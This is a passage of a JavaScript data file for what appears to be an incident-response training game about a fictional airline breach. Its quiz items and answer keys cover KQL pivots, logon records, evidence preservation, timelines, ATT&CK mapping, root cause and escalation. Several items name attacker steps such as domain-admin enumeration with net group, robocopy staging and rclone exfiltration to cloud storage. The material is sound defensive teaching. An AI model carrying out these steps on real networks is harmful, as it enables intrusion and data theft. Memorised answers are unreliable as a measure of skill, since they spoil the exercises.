              { id: "a", text: "| summarize count() by DeviceName", right: true, why: "Three hosts, not one. ta-mnt-wk08 and ta-crw-lt12 raised no alert, because the detection only covers the Ops devices group.", apply: { op: "summarize", by: ["DeviceName"] } },
              { id: "b", text: "| summarize count() by RemoteIP", why: "One row: the address you started from. That is a count of connections, not a list of hosts.", apply: { op: "summarize", by: ["RemoteIP"] } },
              { id: "c", text: "| summarize count() by ActionType", why: "How many connections worked and how many failed. Useful later, but it doesn't say which hosts.", apply: { op: "summarize", by: ["ActionType"] } },
            ],
          },
          {
            id: "who", ask: "Line 5: three hosts is host scope. Now account scope: who signed in on them?",
            choices: [
              { id: "c", text: "| join kind=inner DeviceLogonEvents on DeviceName", right: true, why: "Every sign-in on those three hosts, and nothing from the rest of the fleet.", apply: { op: "join", table: "DeviceLogonEvents", left: "DeviceName", right: "DeviceName" } },
              { id: "b", text: "| join kind=inner DeviceLogonEvents on AccountName", why: "summarize kept only DeviceName and count_, so there is no AccountName left to join on. Join on what the line above left you.", apply: { op: "join", table: "DeviceLogonEvents", left: "AccountName", right: "AccountName" } },
              { id: "a", text: "| join kind=inner DeviceFileEvents on DeviceName", why: "That shows what was written on each host, not who signed in. Choose the table that holds the next question.", apply: { op: "join", table: "DeviceFileEvents", left: "DeviceName", right: "DeviceName" } },
            ],
          },
          {
            id: "success", ask: "Line 6: keep the sign-ins that left something behind on the host.",
            choices: [
              { id: "a", text: '| where LogonType == "Interactive"', why: "That dropped the RDP session and kept a failed attempt. Filter on whether the logon worked, not on how it was made.", apply: { op: "where", col: "LogonType", test: "eq", value: "Interactive" } },
              { id: "b", text: '| where ActionType == "LogonSuccess"', right: true, why: "m.dlamini mistyped a password on a shared crew laptop and left nothing to steal. Four real sessions remain.", apply: { op: "where", col: "ActionType", test: "eq", value: "LogonSuccess" } },
              { id: "c", text: '| where AccountName !in~ ("t.nkosi")', why: "t.nkosi stays in scope. You only learned that name first.", apply: { op: "where", col: "AccountName", test: "notin", value: ["t.nkosi"] } },
            ],
          },
          {
            id: "show", ask: "Line 7: show what the ticket needs: the host, the account, and how each session got there.",
            choices: [
              { id: "a", text: "| project DeviceName, count_", why: "That counts beacons per host and has dropped every account.", apply: { op: "project", cols: ["DeviceName", "count_"] } },
              { id: "b", text: "| summarize count() by LogonType", why: "Two kinds of logon, with no names. The ticket needs to know who.", apply: { op: "summarize", by: ["LogonType"] } },
              { id: "c", text: "| project DeviceName, AccountName, LogonType, RemoteDeviceName", right: true, why: "Four accounts on three hosts. adm-c.ibarra is the line nobody flagged: an admin who opened an RDP session on ta-mnt-wk08 from ta-it-jump1 while that host was beaconing, so that session's credentials are exposed there.", apply: { op: "project", cols: ["DeviceName", "AccountName", "LogonType", "RemoteDeviceName"] } },
            ],
          },
        ],
        expect: 4,
        lesson: "Pivot on what the activity left, not on who the ticket named. Take your own tooling out, keep the failed attempts in, then turn each host into a question about accounts. In a real query add a Timestamp limit, and when you write the result, give its limits: three devices and four accounts in this window, from these two tables. A device with no sensor could not appear here.",
      },
      {
        kind: "sort",
        title: "Earned, or Only Claimed?",
        prompt: "Soren reads your draft scope lines back to you, one at a time. Keep the lines the search really earned. Send back the ones that say more than was searched.",
        buckets: [{ id: "earned", label: "Earned: stays in the note" }, { id: "claimed", label: "Claimed: send it back" }],
        items: [
          { id: "s1", text: "Three devices contacted 198.51.100.44 between 05:00 and 06:30, in DeviceNetworkEvents.", bucket: "earned", why: "It names the result, the window and the source, so anyone can repeat it." },
          { id: "s2", text: "Only three devices are affected.", bucket: "claimed", why: "Three were found by one pivot in one window. This line speaks for every device that exists." },
          { id: "s3", text: "TA-FIN-LT05 shows no connection to the address in this window.", bucket: "earned", why: "It says what was looked at and what came back, and nothing more." },
          { id: "s4", text: "TA-FIN-LT05 is clean.", bucket: "claimed", why: "One table and one address were checked. Clean is a claim about everything else as well." },
          { id: "s5", text: "No data has left Tamarind.", bucket: "claimed", why: "You have checked one destination. Data has other ways out, and none of them have been searched." },
          { id: "s6", text: "No upload over 50 MB left through the proxy in the last 24 hours, per the proxy log.", bucket: "earned", why: "A narrow statement with a size, a window and a source is worth more than a broad one." },
          { id: "s7", text: "The intruder has stopped.", bucket: "claimed", why: "You know one laptop was isolated. Two other hosts have not been looked at yet." },
          { id: "s8", text: "TA-OPS-LT31 shows no connection to 198.51.100.44 after 06:22, when it was isolated, in DeviceNetworkEvents.", bucket: "earned", why: "A fact about one host at one time, and the record shows it." },
        ],
      },
    ],
    // ── Log analysis 2: reading a logon record ──
    "inv7-la2": [
      {
        kind: "anatomy",
        title: "Read a Logon Record: Where It Landed, Where It Came From",
        prompt: "adm-c.ibarra is now in your scope, so you pull the account's history. This is a logon on the crew server from last Thursday: planned work, with a ticket. Read which machine is which, and what each number means, before the graded record.",
        source: "Windows Security log · TA-CRW-SV02",
        fields: [
          { key: "EventID", value: "4624", label: "What happened", note: "A successful logon." },
          { key: "Computer", value: "TA-CRW-SV02.corp.tamarindair.example", label: "Where it landed", note: "The machine that wrote the record. For a logon, that is the target." },
          { key: "TargetUserName", value: "adm-c.ibarra", label: "As whom", note: "The account that logged on." },
          { key: "TargetDomainName", value: "TAMARIND" },
          { key: "WorkstationName", value: "TA-IT-JUMP1", label: "Where it came from", note: "The machine the logon was made from." },
          { key: "IpAddress", value: "10.30.9.5", note: "The source address, which you can pivot on as well." },
          { key: "LogonType", value: "10", label: "How", note: "10 is RemoteInteractive, an RDP session. Each route in has its own number: 3, for example, is a network logon, such as a share or an admin tool." },
          { key: "LogonProcessName", value: "User32" },
          { key: "AuthenticationPackageName", value: "Negotiate", note: "How the logon was authenticated: Kerberos, NTLM, or Negotiate, which picks between them. Note it down and compare it with what this account usually does." },
        ],
        summary: "Read the two machine fields as an arrow: from WorkstationName, to Computer. LogonType says how. One record can tell you that much, and it can't tell you whether this is normal. For that you need a baseline: has this account ever done this, from there? This one has, every patch Thursday from the jump host, and that is why it is fine. Tuesday's session on TA-MNT-WK08 comes from the same jump host and is a different question, because the host at the other end was beaconing.",
      },
    ],
    // ── Reading 3: collect and preserve ──
    "inv7-r3": [
      {
        kind: "worksheet",
        title: "How Long Does It Last?",
        prompt: "TA-MNT-WK08 is in scope, and Lerato in IT wants to reboot it in five minutes so maintenance planning can get back to work. Soren asks you what that costs. Everything you need is in the table.",
        primer: {
          title: "Collect what disappears first",
          points: [
            "**Volatility** means how fast evidence disappears if nobody captures it. The order of collection follows that, not how easy each source is to query.",
            "Spend your first effort where waiting costs you evidence. Whatever lasts for weeks will still be there after you've dealt with whatever lasts for minutes.",
            "Every containment step changes state: killing a session, resetting a password, isolating a host. Changed state can't be changed back, so what you didn't capture first is gone.",
          ],
          example: {
            label: "Worked example: a lost bag, not a laptop",
            lines: [
              "The belt's live display clears in 10 minutes. The CCTV overwrites after 72 hours. The tag-scan log stays for a year.",
              "So: photograph the display now, pull the CCTV today, and query the scan log whenever you like.",
              "Nothing here depends on which source is most useful. Only on which one disappears first.",
            ],
          },
        },
        caption: "Evidence on and around TA-MNT-WK08, and how long Tamarind keeps it",
        columns: ["Evidence", "Where it lives", "Gone when"],
        rows: [
          ["Scheduled tasks and autoruns", "Disk", "Host is re-imaged"],
          ["Sign-in records", "Identity logs", "30 days"],
          ["Open sockets", "Live host state", "Connection closes, or host reboots"],
          ["Firewall session records", "Firewall log", "14 days"],
          ["Running processes and loaded modules", "Memory", "Process exits, or host reboots"],
          ["Mailbox rule changes", "SaaS audit log", "180 days"],
          ["Files in the Temp folder", "Disk", "Host is re-imaged, or files are deleted"],
        ],
        questions: [
          { id: "lost", q: "Lerato reboots it now. How many rows of this table are lost at once?", hint: "Find every row whose third column mentions a reboot.", answer: ["2", "two"], why: "Open sockets and running processes. Everything else survives a reboot, which is why those two come first." },
          { id: "copy", q: "Of those, which one has no second copy anywhere else in the table? (type sockets or processes)", hint: "Is there another row that records who was talking to whom?", answer: ["processes", "running processes", "memory"], why: "The firewall keeps its own record of connections. Nothing else holds what was in memory, so a reboot erases that for good." },
          { id: "order", q: "r.sandhu's session looks wrong and someone offers to kill it now. Should that come before or after you collect from memory? (before/after)", hint: "Can a killed session be put back?", answer: ["after"], why: "Collect, then act. Containment changes state, so the process you were about to capture would be gone. Containing first can be the right risk call, but make it knowingly." },
        ],
      },
      {
        kind: "sort",
        title: "Evidence, or Just a Memory?",
        prompt: "Six months from now a regulator could ask how you know any of this. Go through the case's evidence log and keep the lines that would stand up. Send back the ones that wouldn't.",
        primer: {
          title: "Three stamps turn a file into evidence",
          points: [
            "Every item needs three things from the moment you touch it: **when** it was collected, a **hash** of the file or export so nobody can later doubt it is unchanged, and **who** collected it.",
            "That is chain of custody. Without it, you have a recollection, however good your memory is.",
          ],
          example: {
            label: "Worked example: a ramp incident photo",
            lines: [
              "`ramp_damage_03.jpg`, 11:42 UTC, SHA-256 recorded, taken by the duty engineer. Usable.",
              "The same picture on someone's phone, 'from sometime last week'. Not usable, even if it shows exactly the same dent.",
            ],
          },
        },
        buckets: [{ id: "keep", label: "Stands up" }, { id: "back", label: "Send it back" }],
        items: [
          { id: "e1", text: "Investigation package, TA-OPS-LT31, 06:21 UTC, collected by analyst01, SHA-256 recorded.", bucket: "keep", why: "Time, hash and name, all three." },
          { id: "e2", text: "Live Response transcript, TA-OPS-LT31, 06:19 UTC, collected by analyst01, SHA-256 recorded.", bucket: "keep", why: "Volatile evidence, captured and stamped like everything else." },
          { id: "e3", text: "Sign-in export, 06:44 UTC, collected by s.adebayo, SHA-256 recorded.", bucket: "keep", why: "Complete, and it doesn't matter that someone else collected it, because the record says who." },
          { id: "e4", text: "Process list pasted into the shift chat, no time given.", bucket: "back", why: "No time, no hash, no name, and a chat message is easy to edit." },
          { id: "e5", text: "Crew_Bid_Nov.zip from TA-OPS-LT31, 06:20 UTC, collected by analyst01, no hash taken.", bucket: "back", why: "Nobody can later show that this is the same file that came off the laptop." },
          { id: "e6", text: "Firewall export, Tuesday morning some time, by someone on the night shift.", bucket: "back", why: "A vague time and an unnamed person leave nobody to ask and nothing to check." },
          { id: "e7", text: "Note: 'pretty sure the second beacon was around six'.", bucket: "back", why: "That is a recollection. The record itself says 06:02, and it can be checked." },
        ],
      },
    ],
    // ── Reading 4: timeline, ATT&CK, root cause ──
    "inv7-r4": [
      {
        kind: "sequence",
        title: "One Clock, One Story",
        prompt: "Soren drops four exports on your desk: mail, EDR, sign-ins and the perimeter firewall. Three of them log in UTC. The firewall still logs in UTC+2, a setting nobody changed after install. Tap the events in the order they really happened.",
        primer: {
          title: "Merge every source onto one clock",
          points: [
            "Each source logs its own version of events, in its own format and often its own timezone. Read one at a time, the links between them stay invisible.",
            "A **super-timeline** merges them into one list on one timezone, usually UTC. It is tedious, and it is where most of the insight in a case comes from.",
            "Convert first, then sort: `07:10` at UTC+2 is `05:10` UTC.",
            "The order of work is timeline, then ATT&CK, then root cause. You can't classify a behaviour until you know where it sits, or ask a useful why until you know what happened.",
          ],
          example: {
            label: "Worked example: a door and a camera",
            lines: [
              "Door controller, UTC+3: badge accepted at 09:10.",
              "Camera, UTC: someone at the door at 06:15.",
              "Convert: 09:10 at UTC+3 is 06:10 UTC. The badge came five minutes before the person, so the two may not belong together.",
            ],
          },
        },
        miss: "Convert the firewall times to UTC first, then look for the earliest event left.",
        items: [
          { id: "f3", text: "Firewall 07:52:10: TA-CRW-LT12 to 198.51.100.44:443, denied", note: "05:52:10 UTC. The beacon failed, the malware was still there." },
          { id: "e1", text: "EDR 05:36:12: wscript.exe ran Crew_Bid_Nov.js on TA-OPS-LT31", note: "First code on the first host." },
          { id: "s1", text: "Sign-in 05:56:41: adm-c.ibarra, RDP to TA-MNT-WK08 from TA-IT-JUMP1", note: "Already UTC." },
          { id: "f1", text: "Firewall 07:41:03: TA-OPS-LT31 to 198.51.100.44:443, allowed", note: "05:41:03 UTC." },
          { id: "m1", text: "Mail Mon 18:04:30: Crew_Bid_Nov.zip delivered", note: "The day before, so it starts the list." },
          { id: "e2", text: "EDR 05:39:27: rundll32.exe loaded wxupd.dat on TA-MNT-WK08", note: "The second host, three minutes behind the first." },
          { id: "f2", text: "Firewall 07:47:44: TA-MNT-WK08 to 198.51.100.44:443, allowed", note: "05:47:44 UTC." },
        ],
        order: ["m1", "e1", "e2", "f1", "f2", "f3", "s1"],
        doneNote: "Listed by tool, the firewall lines sit two hours late. On one clock they fall in the middle, and a link appears that no single source shows: the admin opened a session on TA-MNT-WK08 nine minutes after that host began beaconing.",
      },
      {
        kind: "sort",
        title: "What Does This Record Actually Show?",
        prompt: "Soren keeps a sheet of single records from old Tamarind cases for moments like this. File each one under the tactic the record itself shows, not the one you expect to come next.",
        primer: {
          title: "Map the record in front of you",
          points: [
            "ATT&CK gives each behaviour a **tactic** (the goal at that moment) and a **technique** (how it was done). That lets you tell another analyst or a report reader exactly what happened without explaining the mechanics again.",
            "Map from the evidence, one behaviour at a time. What usually comes next is a lead for your hunt, not a label for this line.",
            "An ID such as T1218.011 is technique T1218 with sub-technique 011.",
          ],
          example: {
            label: "Worked example: one record, one label",
            lines: [
              "Record: `rundll32.exe` loads a DLL from the Temp folder.",
              "Tactic: Stealth. Technique: T1218.011, System Binary Proxy Execution: Rundll32, because a trusted Windows binary is running the attacker's code.",
              "What the DLL may do next is a question for the hunt. It isn't on this line.",
            ],
          },
        },
        buckets: [{ id: "disc", label: "Discovery" }, { id: "coll", label: "Collection" }, { id: "exfil", label: "Exfiltration" }, { id: "stealth", label: "Stealth" }, { id: "c2", label: "Command and Control" }],
        items: [
          { id: "t1", text: "robocopy copies 400 roster PDFs from a share into C:\\Users\\Public\\tmp on one workstation", bucket: "coll", why: "Data gathered into one place, and all of it still on a Tamarind machine. T1074.001, Local Data Staging." },
          { id: "t10", text: "A PowerShell loop bundles the day's rosters into one file in Temp with a .NET zip library, nothing has left", bucket: "coll", why: "Files pulled together into one package, all still on the machine. T1560.002, Archive via Library." },
          { id: "t2", text: "Get-ChildItem -Recurse lists every file name under \\\\TA-CRW-SV02\\Rosters", bucket: "disc", why: "Only names came back, and no file was touched. T1083, File and Directory Discovery." },
          { id: "t3", text: "The implant uploads rosters.csv over the HTTPS session it already holds to its C2 address", bucket: "exfil", why: "The record shows the bytes going out, on the channel already in use. T1041." },
          { id: "t4", text: "A PowerShell loop saves a screenshot to the Temp folder every 30 seconds", bucket: "coll", why: "Gathering what's on the screen, stored locally. T1113, Screen Capture." },
          { id: "t5", text: "rclone copies a folder to a personal cloud drive, 2.1 GB transferred", bucket: "exfil", why: "A completed transfer out of the network. T1567.002, Exfiltration to Cloud Storage." },
          { id: "t6", text: "The loader is packed, so a scanner sees only compressed noise until it runs", bucket: "stealth", why: "The content is hidden so tools can't read it, and every defence is still running. T1027.002, Software Packing." },
          { id: "t7", text: "A tool saved as svchost.exe in a user's AppData folder", bucket: "stealth", why: "It looks like something it isn't. T1036.005, Match Legitimate Resource Name or Location." },
          { id: "t9", text: "rundll32.exe calls 198.51.100.44:443 every 20 minutes and gets short replies", bucket: "c2", why: "Regular check-ins for instructions, with nothing large moving. T1071.001, Web Protocols." },
          { id: "t8", text: "net group \"Domain Admins\" /domain, run once from a workstation", bucket: "disc", why: "Asking who holds power, and changing nothing. T1069.002, Domain Groups." },
        ],
      },
      {
        kind: "sequence",
        title: "Five Whys, Down to Something You Can Fix",
        prompt: "ATT&CK says what happened on TA-OPS-LT31. Now Soren wants to know why it was possible at all. Tap the chain from the top down: each line answers 'why?' about the one before it.",
        primer: {
          title: "Keep asking why until someone could fix the answer",
          points: [
            "Root cause asks why something was possible. The discipline is to keep asking why, typically five times, until you reach something a named team could change.",
            "The first answer is usually the moment it happened. It tells you nothing about what to change, so the next incident can walk the same way in.",
          ],
          example: {
            label: "Worked example: a late fuel truck",
            lines: [
              "A flight left late because the fuel truck arrived late.",
              "Why? It was still fuelling another stand. Why? Both aircraft were booked for the same minute.",
              "Why? The schedule is copied by hand from two systems. Why? Nobody owns linking them.",
              "That last answer is something a manager can assign.",
            ],
          },
        },
        miss: "Each line must answer why about the line above it. Which one explains the last line?",
        items: [
          { id: "w3", text: "It was still enabled because ops, maintenance and crew devices sit outside the office hardening baseline that turns it off." },
          { id: "w5", text: "The old tool was retired in 2024, but the exception had no expiry date and no owner, so nobody removed it." },
          { id: "w1", text: "t.nkosi double-clicked Crew_Bid_Nov.js." },
          { id: "w4", text: "They sit outside it because a 2022 exception let an old scheduling tool keep running .vbs files on all three groups." },
          { id: "w2", text: "A double-click ran the script because Windows Script Host was still enabled on that laptop." },
        ],
        order: ["w1", "w2", "w3", "w4", "w5"],
        doneNote: "The top line is the moment it happened. The bottom line is something IT can own: every exception gets an expiry date and a named owner.",
      },
    ],
    // ── Reading 5: document, report, hand off ──
    "inv7-r5": [
      {
        kind: "sort",
        title: "The Five Parts of a Hand-Off",
        prompt: "Soren won't take a paragraph. A hand-off has five named parts, so the day shift can act on it without calling you. Your draft lines for incident 5127 are in a pile: file each one under the part it belongs to.",
        primer: {
          title: "Document as you go, then package five things",
          points: [
            "Step 6 runs beside every other step. Contemporaneous means written at the time: the time you saw it, the field and value, the hash, the query or tool that produced it, and who did it.",
            "**Detection method** tells the next reader whether your tooling would catch a repeat, or whether a person happened to notice.",
            "**Confirmed scope** gives what was searched and found, with its limits. **Timeline** comes from Step 4, in order, with times.",
            "**Root cause** is the control gap from Step 5. **Corrective actions** say what changes so that gap can't produce the same outcome, ideally with an owner.",
          ],
          example: {
            label: "Worked example: a hand-off from another case",
            lines: [
              "Detection: reported by a gate agent, no rule fired.",
              "Scope: 12 mailboxes in message trace, last 7 days, one sender domain.",
              "Timeline: Thu 09:14 delivered, 09:31 first click, 10:02 sender blocked.",
              "Root cause: the vendor's domain was on an allow list that nobody reviews.",
              "Corrective action: review the allow list each quarter, owner mail team lead.",
            ],
          },
        },
        buckets: [{ id: "detect", label: "Detection method" }, { id: "scope", label: "Confirmed scope" }, { id: "time", label: "Timeline" }, { id: "root", label: "Root cause" }, { id: "fix", label: "Corrective actions" }],
        items: [
          { id: "h1", text: "A custom detection fired on TA-OPS-LT31. The rule only covers the Ops devices group.", bucket: "detect", why: "This tells the next reader why two other hosts stayed silent, and that a repeat outside Ops would raise nothing." },
          { id: "h2", text: "TA-MNT-WK08 and TA-CRW-LT12 were found by a manual pivot on 198.51.100.44.", bucket: "detect", why: "How it was caught, and that part depended on a person going back to look." },
          { id: "h3", text: "Three devices and four accounts, DeviceNetworkEvents and DeviceLogonEvents, 05:00 to 06:30.", bucket: "scope", why: "What was searched and what came back, with the window and the sources." },
          { id: "h4", text: "Mon 18:04 delivered, Tue 05:36 script ran, 05:41 first beacon, 05:56 admin RDP to TA-MNT-WK08.", bucket: "time", why: "In order, with times, on one clock." },
          { id: "h5", text: "Windows Script Host stayed on for ops, maintenance and crew devices under a 2022 exception with no expiry and no owner.", bucket: "root", why: "A gap somebody could close, and not just a description of who clicked." },
          { id: "h6", text: "IT closes the exception by 20 November, owner Lerato Moyo.", bucket: "fix", why: "What changes, by when, and who holds it." },
          { id: "h7", text: "Extend the custom detection to all device groups, owner Soren Adebayo.", bucket: "fix", why: "It closes the blind spot the detection line exposed." },
        ],
      },
    ],
    // ── Matching: what each step produces ──
    "inv7-m1": [
      {
        kind: "sort",
        title: "Which Step Produced This?",
        prompt: "Soren opens the case file for incident 5127. A step is only finished when it has left something behind. File each item under the step that produced it.",
        buckets: [
          { id: "s1", label: "Validate" }, { id: "s2", label: "Scope" }, { id: "s3", label: "Collect" },
          { id: "s4", label: "Timeline" }, { id: "s5", label: "ATT&CK and root cause" }, { id: "s6", label: "Document" }, { id: "s7", label: "Report" },
        ],
        items: [
          { id: "p1", text: "5127: hash on 1 device, script host opened a shell, no change ticket, not the logon script in 5118.", bucket: "s1", why: "A written decision that the record is real and understood." },
          { id: "p2", text: "Boundary v3: three hosts, four accounts, reopened after the pivot found TA-MNT-WK08.", bucket: "s2", why: "It carries a version number because it was reopened when evidence changed." },
          { id: "p3", text: "Evidence log: processes, connections, package, firewall export, each with a time, a hash and a name.", bucket: "s3", why: "Fragile items first, and every one stamped." },
          { id: "p4", text: "One list from Mon 18:04 to Tue 06:22, with mail, EDR, firewall and sign-ins in UTC.", bucket: "s4", why: "Several sources, one sequence, one timezone." },
          { id: "p5", text: "T1059.007 on the script, T1218.011 on rundll32, and a chain of whys ending at an exception with no owner.", bucket: "s5", why: "Each behaviour named, then the gap behind them." },
          { id: "p6", text: "Incident comments timed 06:24, 06:41 and 07:02, each added as the finding came in.", bucket: "s6", why: "The times show they were written while it happened, not rebuilt afterwards." },
          { id: "p7", text: "Package to the day-shift lead: how it was caught, scope, timeline, root cause, fixes with owners.", bucket: "s7", why: "Everything the next reader needs, in one place." },
        ],
      },
    ],
    // ── The boss: the escalation decision, on other cases ──
    "inv7-ac1": [
      {
        kind: "defuse",
        title: "Close It, or Send It Up?",
        prompt: "End of shift. Five findings are on the desk, one of them yours, and the clock is the shift change. For each one, cut the call the criteria support. Being able to fix something yourself is a different question from being the person who should decide it.",
        primer: {
          title: "Real is one question. Who decides next is another",
          points: [
            "Once a finding is confirmed real, the next question isn't how sure you are or whether you could contain it. It is whether the finding meets an escalation criterion.",
            "Step 7 has three criteria: **data** that may trigger breach notification; a **privileged or executive account**, or a system with regulatory weight; activity that has reached **collection, staging or exfiltration**.",
            "One criterion is enough, and you don't need proof of the worst case before it counts.",
            "Escalating hands up a decision, not the work. Collection and containment carry on while it is being made.",
            "If no criterion applies, finish it yourself: contain, write it up, close it. Escalating everything teaches people to stop reading your escalations.",
          ],
          example: {
            label: "Worked example: one phish, two endings",
            lines: [
              "A gate agent's password was phished. The sign-in was blocked, no data reached, a standard account. Three criteria, three noes: reset, write it up, close.",
              "The same page, but the account belongs to the Head of Flight Safety. The second criterion applies, so the call goes up, however cleanly you could reset it.",
            ],
          },
        },
        device: "Shift desk",
        seconds: 110,
        rounds: [
          {
            id: "kiosk",
            state: "A coin miner on check-in kiosk TA-KSK-14. The sensor killed it. It ran under a local service account, kiosks hold no passenger data, and a pivot on its hash found nothing else.",
            wires: [{ id: "a", label: "Escalate: anything confirmed goes up" }, { id: "b", label: "Hold it open for the day lead to review" }, { id: "c", label: "Contain, write it up, close it" }],
            cut: "c",
            hint: "Walk the three criteria. Does any of them apply?",
            why: "It's real, and no criterion applies: no sensitive data, no privileged account, nothing past the first stage. This one finishes at your desk, and that is what your authority is for.",
          },
          {
            id: "rule",
            state: "An inbox rule on the Chief Pilot's mailbox forwards anything containing 'roster' to an outside address. You removed it. Twenty minutes old, and nothing else shows on the account.",
            wires: [{ id: "a", label: "Escalate now, with the rule and what you've checked" }, { id: "b", label: "Closed: the rule is gone" }, { id: "c", label: "Reset the password and look again tomorrow" }],
            cut: "a",
            hint: "Whose mailbox is it?",
            why: "An executive account meets the second criterion on its own. Removing the rule was right, and it doesn't settle who needs to know about what was forwarded in those twenty minutes.",
          },
          {
            id: "manifest",
            state: "A contractor's session opened a passenger manifest export on a share it shouldn't reach: 340 names with passport numbers. A standard account, disabled by you. No sign anything left.",
            wires: [{ id: "a", label: "Contain and close: standard account, nothing left" }, { id: "b", label: "Wait for proof that it left, then escalate" }, { id: "c", label: "Escalate: this data may carry notification duties" }],
            cut: "c",
            hint: "Which criterion is about what was touched, not who touched it?",
            why: "Passport numbers meet the data criterion, whatever the account. Whether notification is owed is a decision for legal and privacy, and it can't wait for you to prove the worst.",
          },
          {
            id: "upload",
            state: "An alert: 1.2 GB to a cloud drive from a training laptop. You check: change ticket CHG-4502, an approved vendor drive, the training team's safety videos, and the owner confirms it.",
            wires: [{ id: "a", label: "Isolate the laptop and escalate as exfiltration" }, { id: "b", label: "Close as expected activity, ticket attached" }, { id: "c", label: "Escalate to be on the safe side" }],
            cut: "b",
            hint: "The criteria apply to confirmed findings. Is this one?",
            why: "A transfer isn't exfiltration when Step 1 has explained it: a ticket, a known destination, an owner. Escalating out of nerves costs the lead's attention and teaches nothing.",
          },
          {
            id: "ours",
            state: "Back to 5127. Three hosts, four accounts. adm-c.ibarra, a domain admin, held an RDP session on TA-MNT-WK08 while it was beaconing. You could reset the account yourself. No data movement found so far.",
            wires: [{ id: "a", label: "Reset it, isolate the hosts, close at shift end" }, { id: "b", label: "Wait until that account shows up somewhere else" }, { id: "c", label: "Escalate to the IR lead now, and keep collecting" }],
            cut: "c",
            hint: "You can do the reset. Is that what decides this?",
            why: "A privileged account in scope meets the second criterion, even with nothing else found. The reset may well be the next move, and the IR lead has to know before that account's reach is decided.",
          },
        ],
        lesson: "Walk the three criteria once, out loud. One is enough, proof of the worst case isn't required, and your ability to fix it is not on the list. No criterion means it is yours to finish. Either way the technical work keeps going.",
      },
    ],
    // ── The flag: whole minutes between two records ──
    "inv7-f1": [
      {
        kind: "worksheet",
        title: "Whole Minutes Between Two Records",
        prompt: "Soren's timelines state gaps in complete minutes, so everyone quotes the same number. Work out two gaps from Tuesday's records.",
        caption: "Incident 5127, record times in UTC",
        columns: ["Record", "Timestamp"],
        rows: [
          ["wscript.exe ran the script on TA-OPS-LT31", "2026-11-03T05:36:12Z"],
          ["adm-c.ibarra RDP session on TA-MNT-WK08", "2026-11-03T05:56:41Z"],
          ["TA-OPS-LT31 isolated", "2026-11-03T06:22:05Z"],
        ],
        questions: [
          { id: "g1", q: "How many complete minutes from the script to the RDP session?", hint: "56:41 minus 36:12. Drop what's left over after the whole minutes.", answer: ["20"], why: "20 minutes and 29 seconds, so 20 complete minutes." },
          { id: "g2", q: "How many complete minutes from the script to isolation?", hint: "Write 06:22:05 as 05:82:05, then subtract.", answer: ["45"], why: "05:82:05 minus 05:36:12 is 45 minutes and 53 seconds. The seconds don't round up: 45 complete minutes." },
        ],
      },
    ],
  },
};
